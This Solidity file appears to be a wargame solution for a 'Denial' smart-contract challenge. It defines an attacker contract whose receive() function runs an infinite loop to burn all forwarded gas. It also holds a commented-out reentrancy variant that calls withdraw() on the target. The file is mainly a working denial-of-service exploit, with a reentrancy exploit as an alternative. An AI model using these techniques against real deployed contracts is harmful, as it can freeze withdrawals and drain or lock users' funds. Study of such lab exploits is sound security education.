// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";

contract AttackingDenial {
    address payable public contractAddress;
    Denial denial;

    constructor(address payable _contractAddress) {
        contractAddress = _contractAddress;
        denial = Denial(contractAddress);
    }

    receive() external payable {
        /// METHOD 1
        uint i = 0;
        while (true) {
            i++;
        }
        /// METHOD 2
        // if (contractAddress.balance > 0) {
        //     denial.withdraw();
        // }
    }
}
